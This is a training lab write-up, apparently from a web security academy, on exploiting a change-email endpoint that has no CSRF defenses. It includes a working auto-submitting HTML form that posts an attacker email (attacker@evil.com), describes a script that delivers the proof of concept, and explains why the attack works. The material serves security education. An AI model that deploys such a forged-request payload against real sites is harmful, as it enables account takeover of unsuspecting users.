# Lab 1: CSRF vulnerability with no defenses

**Difficulty:** Apprentice

## Goal

Use a CSRF attack to change the victim's email address. The change-email endpoint has no CSRF defenses at all.

## Exploit

An auto-submitting HTML form hosted on the exploit server (`exploit.html`). It posts to the change-email endpoint with an attacker-controlled email. The victim's session cookie is attached automatically by the browser, which is the entire CSRF mechanism.

```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```

Store it on the exploit server and deliver to the victim.

## Why it works

The three CSRF preconditions are all met:

1. **A relevant action** - changing the account email
2. **Cookie-based session handling** - the request is authorized only by the session cookie, which the browser sends automatically on any request to the target, including one triggered from the attacker's page
3. **No unpredictable parameters** - the only field is `email`, which the attacker fully controls. There is no CSRF token to guess

## Running the script

`solve.py` drives the exploit server's store + deliver API (what the "Deliver to victim" button does), so it can solve the lab from the command line:

```bash
python solve.py https://exploit-XXX.exploit-server.net https://0a...web-security-academy.net
```

Optional `--email` sets the address. Python cannot itself be the cross-site victim browser, but it can upload the PoC and trigger delivery.

## Takeaway

With no token, no SameSite restriction, and no Referer check, a session cookie alone is not authorization - it proves who you are, not that you intended the request. Every later lab adds one of these defenses and then breaks it.
